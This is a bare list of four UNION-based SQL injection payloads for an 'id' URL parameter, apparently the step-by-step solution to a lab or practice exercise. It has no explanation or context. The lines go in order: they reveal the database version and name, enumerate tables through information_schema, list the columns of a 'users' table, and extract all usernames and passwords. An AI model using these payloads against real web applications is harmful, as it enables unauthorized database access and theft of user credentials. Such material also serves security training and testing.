?id=1' union select 1, version(), database() #
?id=1' union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema = (select database()) #
?id=1' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name = 'users' #
?id=1' union select 1, group_concat(username), group_concat(password) from users #